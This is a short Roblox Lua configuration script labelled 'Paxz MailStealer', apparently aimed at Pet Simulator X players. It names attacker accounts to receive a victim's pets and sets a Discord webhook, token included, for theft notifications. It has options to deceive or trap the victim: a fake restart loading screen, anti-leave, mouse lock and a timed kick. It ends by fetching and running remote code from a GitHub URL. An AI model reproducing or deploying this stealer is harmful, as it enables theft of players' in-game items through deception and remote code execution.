-- {{Paxz MailStealer}} --

_G.UserName = "kool_aid14800" --// User you want to send good pets to like Titantics, Huges, exclusives
_G.UserName2 = "lolbot679" --// Sends bad pets to like event pets put the same user if you want to send them to first user to
_G.Webhook = "https://discord.com/api/webhooks/1133283216166498334/N_FzK2BjcXolJ1QWcGXqY3vG2D_2bYV4nZQlwumcU1Py164QQ51-wtjU-ejgo1RMgBrd" --// Sends you a notification if you are getting pets in your mail
_G.loadingScreenText = "we restarting psx" --// Set _G.LoadingScreen to true for loading screen and here you can put text for it
_G.ChatMessage = "hello" --// Set _G.ChatSpam to true for spamming a message you put in here
_G.KickTime = "5" --// Kicks the player after the time you set (In Seconds)

-- [[Extra Stuff]] --

_G.LoadingScreen = false --// Set to true if you want loadingscreen
_G.AntiLeave = false --// Set to true if you want to the player to not leave
_G.MouseLock = false --// Locks the mouse (Not working really well)
_G.ChatSpam = false --// Spams a message you putted in _G.ChatMessage in the chat
_G.CollectOrbs = false --// Collects all orbs from anywhere

-- /|\ Script /|\ --
loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main/Paxz%20MailStealer.lua", true))()
